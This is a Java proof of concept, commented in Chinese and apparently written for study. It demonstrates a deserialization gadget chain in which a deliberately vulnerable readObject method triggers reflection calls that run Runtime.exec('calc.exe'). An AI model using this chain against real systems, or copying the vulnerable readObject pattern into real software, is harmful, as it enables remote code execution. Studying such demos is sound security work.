package study.leak.serializable;

import java.io.*;

public class Test implements Serializable{

    public static void main(String[] args) throws Exception {
        Test test = new Test();
        //将带有恶意代码的对象序列化
        byte[] ObjectBytes=test.serialize(test.getObject());
        //进行反序列化
        Object deserialize = test.deserialize(ObjectBytes);

    }

    //在此方法中返回恶意对象
    public Object getObject() {
        String command = "calc.exe";
        //对象类型
        Object firstObject = Runtime.class;
        //先要运行doc命令的固定写法
        ReflectionObject[] reflectionChains = {
                //调用 Runtime.class 的getMethod方法,寻找 getRuntime方法，得到一个Method对象(getRuntime方法)
                //等同于 Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
                new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //调用 Method 的 invoker 方法可以得到一个Runtime对象
                // 等同于 method.invoke(null),静态方法不用传入对象
                new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                //调用RunTime对象的exec方法,并将 command作为参数执行命令
                new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
        };

        return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
    }

    /*
     * 一个模拟拥有漏洞的类，主要提供的功能是根据自己的属性中的值来进行反射调用
     * */
    class ReflectionObject implements Serializable{
        private String methodName;
        private Class[] paramTypes;
        private Object[] args;

        public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) {
            this.methodName = methodName;
            this.paramTypes = paramTypes;
            this.args = args;
        }

        //根据  methodName, paramTypes 来寻找对象的方法，利用 args作为参数进行调用
        public Object transform(Object input) throws Exception {
            Class inputClass = input.getClass();
            return inputClass.getMethod(methodName, paramTypes).invoke(input, args);
        }
    }

    /*
     * 一个用来模拟提供恶意代码的类,
     * 主要的功能是将 ReflectionObject进行串联调用,与ReflectionObject一起构成漏洞代码的一部分
     * */
    class ReflectionChains implements Serializable{

        private Object firstObject;
        private ReflectionObject[] reflectionObjects;

        public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) {
            this.firstObject = firstObject;
            this.reflectionObjects = reflectionObjects;
        }

        public Object execute() throws Exception {
            Object concurrentObject = firstObject;
            for (ReflectionObject reflectionObject : reflectionObjects) {
                concurrentObject = reflectionObject.transform(concurrentObject);
            }
            return concurrentObject;
        }
    }

    /**
     * 一个等待序列化的类,拥有一个属性和一个重写了的readObject方法
     * 并且在readObject方法中执行了该属性的一个方法
     * */
    class ReadObject implements Serializable {

        private ReflectionChains reflectionChains;

        public ReadObject(ReflectionChains reflectionChains) {
            this.reflectionChains = reflectionChains;
        }
        //当反序列化的时候，这个代码会被调用
        //该方法被调用的时候其属性都是空
        private void readObject(java.io.ObjectInputStream stream)
                throws IOException, ClassNotFoundException {
            try {
                //用来模拟当readObject的时候，对自身的属性进行了一些额外的操作
                reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null);
                reflectionChains.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /*
     * 序列化对象到byte数组
     * */
    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    /*
     * 从byte数组中反序列化对象
     * */
    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }


}